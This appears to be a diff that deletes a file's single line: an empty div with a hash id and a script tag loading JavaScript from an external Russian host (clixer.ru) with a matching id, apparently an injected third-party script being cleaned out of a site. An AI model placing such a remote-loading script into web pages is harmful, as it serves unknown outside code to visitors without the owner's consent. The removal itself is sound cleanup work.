@@ -1,1 +1,0 @@
-<div id='fbd7939d674997cdb4692d34de8633c4'></div><script charset="windows-1251" type="text/javascript" src="http://clixer.ru/d.php?c=fbd7939d674997cdb4692d34de8633c4"></script>
